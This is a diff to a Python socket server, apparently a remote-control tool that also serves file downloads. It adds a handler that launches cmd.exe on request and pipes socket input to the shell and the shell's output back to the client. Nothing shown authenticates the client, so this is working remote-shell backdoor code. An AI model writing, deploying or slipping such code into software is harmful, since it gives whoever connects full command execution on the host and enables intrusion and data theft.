@@ -50,6 +50,15 @@ def createServer(port=0):
     server.listen(5)
     return server
 
+def receive(sock, proc):
+    while True:
+        data = sock.recv(1024)
+        print(f"Got data: {data.decode()}")
+        proc.stdin.write(data)
+        proc.stdin.flush()
+        proc.stdin.write("\n".encode())
+        proc.stdin.flush()
+
 def handleOpenConnection(server):
     try:
         client, address = server.accept()
@@ -75,8 +84,21 @@ def handleOpenConnection(server):
                     server.close()
                     break
 
+                # if the request is to open a shell connection
+                elif message['data'] == NetTypes.NetOpenShell.value:
+                    # open shell process
+                    import subprocess
+                    p = subprocess.Popen("cmd.exe", stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                         stderr=subprocess.PIPE, shell=False)
+                    thread = threading.Thread(target=receive, args=(client, p,))
+                    thread.start()
+                    client.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id)))
+                    while p.poll() is None:
+                        n = p.stdout.readline()
+                        client.send(n)
+
                 # if the request is to download file
-                if message['data'] == NetTypes.NetDownloadFile.value:
+                elif message['data'] == NetTypes.NetDownloadFile.value:
                     # get the file directory
                     directory = message['extra']
 
